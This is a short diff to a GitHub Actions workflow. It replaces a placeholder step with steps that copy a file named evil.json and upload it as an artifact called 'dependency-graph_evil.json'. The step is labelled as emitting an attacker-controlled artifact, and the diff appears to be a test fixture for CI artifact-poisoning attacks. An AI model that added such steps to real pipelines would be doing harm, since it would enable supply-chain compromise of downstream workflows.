@@ -5,4 +5,12 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "base upstream PR workflow placeholder"
+      - uses: actions/checkout@v4
+      - name: Emit attacker-controlled dependency-graph artifact
+        run: |
+          mkdir -p out
+          cp evil.json out/evil.json
+      - uses: actions/upload-artifact@v4
+        with:
+          name: dependency-graph_evil.json
+          path: out/evil.json
